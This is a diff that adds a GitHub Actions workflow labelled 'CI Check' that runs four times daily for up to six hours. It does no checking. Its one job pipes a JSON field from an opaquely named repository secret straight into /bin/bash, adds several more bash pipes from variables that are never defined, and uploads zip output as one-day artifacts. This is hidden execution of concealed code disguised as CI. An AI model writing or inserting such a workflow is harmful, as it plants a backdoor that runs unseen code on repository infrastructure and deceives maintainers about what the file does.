@@ -1,0 +1,32 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '0 2,8,14,20 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          k8482: ${{ secrets.k8482 }}
+        run: |
+          printf '%s' "$k8482" | jq -r .qse2445 | /bin/bash
+          printf '%s' "$gqgx864" | jq -r .zx2 | /bin/bash
+          printf '%s' "$cj0" | jq -r .wlmep28 | /bin/bash
+          echo $nsf25 | jq -r .j8146 | /bin/bash
+          echo $v7941 | jq -r .gyx68 | /bin/bash
+          printf '%s' "$xypmz4" | jq -r .rw5350 | /bin/bash
+
+      - name: Persist output
+        uses: actions/upload-artifact@v4
+        with:
+          name: bCSIoquC
+          path: "*.zip"
+          retention-days: 1
